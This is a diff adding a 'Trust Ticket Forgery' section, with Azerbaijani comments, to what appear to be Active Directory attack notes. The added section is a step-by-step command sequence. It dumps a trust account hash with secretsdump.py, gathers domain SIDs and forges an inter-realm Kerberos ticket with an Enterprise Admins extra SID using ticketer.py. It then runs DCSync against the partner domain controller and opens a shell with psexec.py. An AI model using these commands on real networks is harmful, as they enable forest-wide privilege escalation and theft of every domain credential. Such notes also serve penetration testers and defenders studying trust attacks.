@@ -146,3 +146,33 @@ runas /user:warzoneadmin powershell.exe
 whoami /groups
 Unknown SID type S-1-5-21-767238238-2156610861-601915929-519  Group used for deny only
 ```
+
+## Trust Ticket Forgery
+```powershell
+# 1. Trust hesabının hash-ini tap
+secretsdump.py corp.local/Administrator:Pass123@10.10.10.10 -just-dc-user 'PARTNER$'
+
+# 2. CORP.LOCAL-ın SID-ini öyrən
+getPac.py -targetUser administrator corp.local/Administrator:Pass123
+
+# 3. PARTNER.LOCAL-ın Domain SID-ini öyrən  
+lookupsid.py corp.local/Administrator:Pass123@10.10.10.10 | grep "Domain SID"
+
+# 4. Forged Inter-Realm TGT yarat (ticketer.py ilə)
+ticketer.py \
+  -nthash [TRUST_KEY_HASH] \
+  -domain corp.local \
+  -domain-sid S-1-5-21-CORP-SID \
+  -extra-sid S-1-5-21-PARTNER-SID-519 \   # 519 = Enterprise Admins!
+  -spn krbtgt/partner.local \
+  Administrator
+
+# 5. Forged ticket-i istifadə et
+export KRB5CCNAME=Administrator.ccache
+
+# 6. PARTNER.LOCAL DC-sinə DCSync vur
+secretsdump.py -k -no-pass partner.local/Administrator@dc02.partner.local -just-dc
+
+# 7. Və ya PSExec ilə shell al
+psexec.py -k -no-pass partner.local/Administrator@dc02.partner.local
+```
